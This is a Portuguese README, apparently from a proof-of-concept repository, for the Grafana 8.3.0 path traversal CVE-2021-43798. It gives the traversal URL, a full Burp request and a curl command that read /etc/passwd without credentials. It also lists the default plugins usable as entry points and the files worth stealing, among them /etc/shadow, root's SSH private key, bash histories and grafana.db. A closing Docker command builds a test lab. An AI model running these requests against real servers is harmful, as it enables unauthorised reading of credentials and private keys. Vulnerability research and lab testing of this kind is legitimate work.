# CVE-2021-43798 Grafana | Vulnerabilidade de leitura arbitrária não autorizada de arquivos

**Versão 8.3.0**

Para mais informações da correção da falha:
https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/

Exemplo: Capturando o arquivo 
```/etc/passwd```

![Captura de tela 2022-05-20 075544](https://user-images.githubusercontent.com/39815226/169514111-8f8edb22-dc05-4daa-8b4c-f26dafdfd6b1.png)

## A Falha
A falha consiste em obter a leitura de arquivos locais sem a necessidade de credênciais válidas. É possível explorar a falha pelo [BurpSuite](https://portswigger.net/burp), Curl ou
qualquer linguagem de preferência.

A URL vulnerável:

```http://<IP_ALVO>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd```

#### No Burp
Enviamos essa requisição
```
GET /public/plugins/alertlist/../../../../../../../../etc/passwd HTTP/1.1
Host: localhost:3000
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```
#### No Curl
Com a opção ```--path-as-is``` podemos enviar via Curl a seguinte requisição

```curl --path-as-is http://<IP_ALVO>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd```

## Lista dos Plugins Padrões
Esta falha explora esses plugins padrões do sistema

_O arquivo está salvo como lista.txt_

```
alertlist
annolist
grafana-azure-monitor-datasource
barchart
bargauge
cloudwatch
dashlist
elasticsearch
gauge
geomap
gettingstarted
stackdriver
graph
graphite
heatmap
histogram
influxdb
jaeger
logs
loki
mssql
mysql
news
nodeGraph
opentsdb
piechart
pluginlist
postgres
prometheus
stat
state-timeline
status-history
table
table-old
tempo
testdata
text
timeseries
welcome
zipkin
```
## Arquivos Interessantes para Explorar
Alguns arquivos interessantes que é possível vizualizar com a falha
```
/conf/defaults.ini
/etc/grafana/grafana.ini
/etc/passwd
/etc/shadow
/home/grafana/.bash_history
/home/grafana/.ssh/id_rsa
/root/.bash_history
/root/.ssh/id_rsa
/usr/local/etc/grafana/grafana.ini
/var/lib/grafana/grafana.db
/proc/net/fib_trie
/proc/net/tcp
/proc/self/cmdline
```
## Criando um Ambiente de Testes
É possível recriar a falha em um ambiente de teste via [Docker](https://www.docker.com). Após ter feito as configurações iniciais do docker, basta seguir este comando

```docker run --name=grafana -p 3000:3000 grafana/grafana-enterprise:8.3.0```

Depois basta acessar ```http://localhost:3000``` e explorar

